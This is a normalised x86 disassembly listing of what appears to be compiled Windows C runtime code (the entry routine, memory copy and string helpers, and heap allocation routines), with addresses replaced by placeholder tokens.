div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_408f08
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_40bc27
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_40bc27
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_408fa0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_409000 ]
jmp [ ecx * 4 + jump_table_40907c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4090e8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4090e8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_409280 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_409188 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409280 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4090e8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4090e8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4090e8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_409280 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409280 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409280 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409280 ]
sub_4092e0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_409349
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_409383
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_40bdc8
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40af2e
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_409430
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
xor esi esi
push esi
call sub_40966d
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] esi
call sub_40ba7c
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_40cf68
mov [ rw-data ] eax
call sub_40cd1b
call sub_40cc62
call sub_40ac18
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_40cc0a
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x1c
call sub_409649
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_401250
mov [ ebp - 0x60 ] eax
push eax
call sub_40ac45
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_40ca86
pop ecx
pop ecx
retn
sub_40966d
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_4096a9
test eax eax
jne r-xdata
push 0x1
pop eax
retn
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_4096a9
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_4096e7
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_409712
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov eax [ ecx + 0x10 ]
mov esi edx
sub esi [ ecx + 0xc ]
mov ebx [ edx - 0x4 ]
add edx 0xfffffffc
push edi
shr esi 0xf
mov ecx esi
mov edi [ edx - 0x4 ]
imul ecx ecx 0x204
dec ebx
mov [ ebp - 0x4 ] edi
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + edx ]
test cl 0x1
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov edi ebx
sar edi 0x4
dec edi
cmp edi 0x3f
jbe r-xdata
sar ecx 0x4
push 0x3f
dec ecx
pop edi
mov [ ebp + 0xc ] ecx
cmp ecx edi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x1
mov [ ebp - 0x14 ] ecx
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebx + edx + 0x4 ]
cmp ecx [ ebx + edx + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
push 0x3f
mov [ ebp - 0x8 ] edx
dec ecx
pop edx
cmp ecx edx
mov [ ebp + 0xc ] ecx
jbe r-xdata
mov ecx [ ebx + edx + 0x8 ]
mov edi [ ebx + edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ ebx + edx + 0x4 ]
mov edi [ ebx + edx + 0x8 ]
add ebx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] edi
mov [ ebp - 0xc ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
add ebx [ ebp - 0x4 ]
mov edi ebx
mov [ ebp - 0xc ] ebx
sar edi 0x4
dec edi
cmp edi edx
jbe r-xdata
mov [ ebp + 0xc ] edx
mov ecx edx
add ecx 0xffffffe0
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0xc4 ] edi
dec [ ecx ]
jne r-xdata
mov edi 0x80000000
shr edi cl
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0x44 ] edi
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ edx ] ebx
mov [ ebx + edx - 0x4 ] ebx
dec [ eax ]
jne r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
cmp ecx edi
je r-xdata
mov edi edx
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edi
mov ecx [ ebp + 0x8 ]
and [ ecx ] edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call edi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edi - 0x20 ]
mov edi 0x80000000
shr edi cl
lea eax [ eax + esi * 4 + 0xc4 ]
or [ eax ] edi
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edi
shr ebx cl
lea eax [ eax + esi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
mov ebx [ ebp - 0xc ]
add ecx 0xffffffe0
mov edx 0x80000000
shr edx cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0xc4 ] edx
dec [ ecx ]
jne r-xdata
mov edx 0x80000000
shr edx cl
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0x44 ] edx
dec [ ecx ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call edi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_408fa0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
and [ ecx ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x14
mov [ rw-data ] eax
mov [ rw-data ] esi
sub_409a3d
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_409df7
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_409d46
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_409d46
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_409df7
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
